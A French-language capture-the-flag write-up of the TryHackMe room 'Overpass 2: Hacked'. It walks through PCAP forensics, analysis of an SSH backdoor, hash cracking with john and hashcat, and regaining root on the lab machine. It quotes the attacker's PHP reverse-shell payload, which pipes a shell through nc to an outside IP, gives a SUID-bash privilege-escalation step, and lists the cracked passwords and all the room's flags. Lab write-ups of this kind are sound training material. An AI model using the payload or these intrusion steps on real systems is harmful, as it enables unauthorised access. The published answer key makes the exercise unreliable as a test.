# TryHackMe: Overpass 2: Hacked

**Objectif :** analyser un PCAP pour reconstituer l'attaque initiale, etudier le code du backdoor SSH deploye par l'attaquant, casser le mot de passe utilise pour y acceder, puis reprendre le controle de la machine compromise et retrouver les flags.

---

## Introduction

**Overpass 2: Hacked** est une room tres utile parce qu'elle commence par de la **forensic / network analysis** avant de basculer en compromission classique.

La progression se fait en trois temps :

1. analyser le PCAP
2. comprendre le backdoor
3. reutiliser ce qu'on a appris pour reprendre la machine

La room est guidee, donc je reprends chaque question en suivant le deroulement logique.

---

## Task 1: Forensics: Analyse the PCAP

Je telecharge le PCAP fourni par la room et je l'ouvre dans Wireshark.

### Question 1.1: What was the URL of the page they used to upload a reverse shell?

Je filtre sur le trafic HTTP :

```text
http
```

En suivant le premier flux HTTP, on voit rapidement :

```text
GET /development/ HTTP/1.1
```

### Reponse

**Upload page URL:** `/development/`

### Question 1.2: What payload did the attacker use to gain access?

Dans le stream HTTP suivant, on retrouve la requete POST d'upload vers `upload.php`. Le fichier envoye est `payload.php`.

Le contenu du payload est :

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

### Reponse

**Payload used:** `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

### Question 1.3: What password did the attacker use to privesc?

En suivant ensuite le flux TCP vers le port `4242`, on voit les commandes tapees par l'attaquant dans son shell reverse.

Le mot de passe utilise pour `su` est :

```text
whenevernoteartinstant
```

### Reponse

**Privesc password used by attacker:** `whenevernoteartinstant`

### Question 1.4: How did the attacker establish persistence?

Dans le meme flux, on voit un `git clone` d'un projet GitHub nomme :

```text
ssh-backdoor
```

### Reponse

**Persistence method:** `ssh-backdoor`

### Question 1.5: Using the fasttrack wordlist, how many of the system passwords were crackable?

Le flux montre aussi un extrait de `/etc/shadow`. Je copie les hashes dans un fichier puis je lance :

```bash
john --wordlist=/usr/share/wordlists/fasttrack.txt hashes.txt
```

Je retrouve :

```text
4
```

### Reponse

**Crackable system passwords:** `4`

---

## Task 2: Research: Analyse the code

Maintenant que j'ai le nom du backdoor, je recupere son code.

```bash
git clone https://github.com/NinjaJc01/ssh-backdoor
cd ssh-backdoor
```

### Question 2.1: What’s the default hash for the backdoor?

En ouvrant `main.go`, on trouve une valeur hardcodee :

```text
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```

### Reponse

**Default hash:** `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

### Question 2.2: What’s the hardcoded salt for the backdoor?

La fonction `passwordHandler()` appelle :

```text
verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
```

### Reponse

**Hardcoded salt:** `1c362db832f3f864c8c2fe05f2002a05`

### Question 2.3: What was the hash that the attacker used?

En revenant au PCAP, on voit l'attaquant lancer :

```text
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

### Reponse

**Attacker hash:** `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

### Question 2.4: Crack the hash using rockyou and a cracking tool of your choice. What’s the password?

Le code montre que le hash est de type :

```text
sha512($pass.$salt)
```

Le mode Hashcat adapte est :

```text
1710
```

Je prepare alors :

```bash
cat > hash.txt <<EOF
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
EOF

hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt
```

Le mot de passe cracke est :

```text
november16
```

### Reponse

**Backdoor password:** `november16`

---

## Task 3: Attack: Get back in!

### Question 3.1: The attacker defaced the website. What message did they leave as a heading?

Je deploie la machine puis j'ouvre le site sur le port 80.

Le message affiche est :

```text
H4ck3d by CooctusClan
```

### Reponse

**Defacement heading:** `H4ck3d by CooctusClan`

### Question 3.2: Using the information you’ve found previously, hack your way back in!

Le scan Nmap de la machine montre maintenant :

- `22/tcp`
- `80/tcp`
- `2222/tcp`

Le backdoor SSH ecoute sur `2222`. Il suffit donc de s'y connecter avec le mot de passe cracke :

```bash
ssh james@<IP> -p 2222
```

Mot de passe :

```text
november16
```

### Reponse

`Done`

### Question 3.3: What’s the user flag?

Une fois connecte en tant que `james`, je lis :

```bash
cat /home/james/user.txt
```

### Reponse

**user.txt:** `thm{d119b4fa8c497ddb0525f7ad200e6567}`

### Question 3.4: What’s the root flag?

En listant le home de `james` avec les fichiers caches :

```bash
ls -la /home/james
```

on repere un binaire root avec SUID :

```text
.suid_bash
```

Les permissions montrent bien un `6755`.

Comme pour Bash SUID classique, il suffit de lancer :

```bash
./.suid_bash -p
```

Je deviens root, puis je lis :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `thm{d53b2684f169360bb9606c333873144d}`

---

## Resume des reponses de la room

- What was the URL of the page they used to upload a reverse shell? `/development/`
- What payload did the attacker use to gain access? `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`
- What password did the attacker use to privesc? `whenevernoteartinstant`
- How did the attacker establish persistence? `ssh-backdoor`
- Using the fasttrack wordlist, how many of the system passwords were crackable? `4`
- What’s the default hash for the backdoor? `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`
- What’s the hardcoded salt for the backdoor? `1c362db832f3f864c8c2fe05f2002a05`
- What was the hash that the attacker used? `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
- Crack the hash ... What’s the password? `november16`
- The attacker defaced the website. What message did they leave as a heading? `H4ck3d by CooctusClan`
- Using the information you’ve found previously, hack your way back in! `Done`
- What’s the user flag? `thm{d119b4fa8c497ddb0525f7ad200e6567}`
- What’s the root flag? `thm{d53b2684f169360bb9606c333873144d}`

---

## Conclusion

**Overpass 2: Hacked** est une tres bonne room parce qu'elle oblige a travailler avec des artefacts d'incident avant de retenter l'exploitation. C'est un excellent pont entre l'analyse forensique et la reprise d'acces offensive.

***Auteur*** *: Saad Idrissi*
